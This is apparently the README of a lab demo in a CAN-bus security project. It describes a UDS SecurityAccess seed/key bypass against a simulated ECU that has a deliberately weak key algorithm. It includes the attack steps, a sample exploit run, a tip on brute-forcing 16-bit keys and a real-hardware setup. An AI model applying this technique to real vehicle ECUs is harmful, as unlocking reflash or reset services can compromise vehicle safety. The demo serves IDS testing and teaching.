# uds securityaccess bypass

quick offensive demo against a diagnostic ecu. it's the classic seed/key attack:
lots of real ecus "lock" privileged services (reflash, reset, clear DTCs) behind
service 0x27, but the seed->key algorithm is often trivial, so if you recover it
you can unlock the ecu yourself.

## the target

`UdsEcu` (in src/uds.cpp) answers UDS over CAN on 0x7E0 (request) / 0x7E8 (reply),
single-frame iso-tp. it gates ECU reset (0x11) behind SecurityAccess (0x27):

- `27 01` -> `67 01 <seed>`  (hands out a seed)
- `27 02 <key>` -> `67 02` if the key is right, else `7F 27 35`
- `11 01` -> `51 01` only if unlocked, else `7F 11 33`

its key routine is `key = (seed ^ 0x1234) + 0x1111`. weak on purpose, but real
ecus have shipped stuff this simple.

## the attack

`canshield_exploit` just talks the protocol:

1. try `11 01` while locked -> denied (`7F 11 33`)
2. `27 01` -> read the seed
3. compute `key = f(seed)` with the recovered algorithm
4. `27 02 <key>` -> unlocked
5. `11 01` -> accepted

run it:

```sh
./build/canshield_exploit
```

sample run:

```
--> 11 01            (ecu reset, still locked)
<-- 7F 11 33        (denied, security not unlocked)
--> 27 01            (request seed)
<-- 67 01 BE EF      (seed = 0xBEEF)
[*] key = f(seed) = 0xBDEC   (algorithm recovered by RE)
--> 27 02 BD EC      (send key)
<-- 67 02           (unlocked)
--> 11 01            (ecu reset, now unlocked)
<-- 51 01           (accepted -> ecu reset)
```

## notes

- if you don't know the algorithm, a 16-bit key is only 65536 tries. real ecus
  push back with attempt limits + delays (`7F 27 36`), which this target doesn't
  model.
- it ties back to the IDS side of the project: a single clean 0x27 exchange like
  this is quiet, but the diagnostic-rate detector will catch a brute-force storm.
- on real hardware run the ecu on one node (`--serve --iface can0`) and the
  exploit on another (`--iface can0`).
